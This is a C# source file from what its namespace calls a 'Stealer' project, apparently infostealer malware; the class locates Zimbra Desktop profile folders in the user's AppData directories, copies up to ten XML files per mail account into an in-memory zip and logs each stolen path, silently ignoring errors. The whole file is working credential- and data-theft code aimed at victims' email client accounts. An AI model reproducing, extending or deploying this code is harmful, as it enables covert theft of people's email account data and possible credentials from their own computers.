using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class ZimbraDesktop : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Zimbra", "Zimbra Desktop");
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Zimbra", "Zimbra Desktop");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "ZimbraDesktop";

            bool foundData = false;

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string profilePath = Path.Combine(basePath, "profile");
                if (Directory.Exists(profilePath))
                {
                    string[] accountDirs = Directory.GetDirectories(profilePath, "*", SearchOption.TopDirectoryOnly);

                    foreach (string accountDir in accountDirs)
                    {
                        string accountName = Path.GetFileName(accountDir);

                        string[] xmlFiles = Directory.GetFiles(accountDir, "*.xml", SearchOption.TopDirectoryOnly);
                        
                        foreach (string file in xmlFiles.Take(10))
                        {
                            string fileName = Path.GetFileName(file);
                            string zipPath = $"Applications\\ZimbraDesktop\\{location}\\{accountName}\\{fileName}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
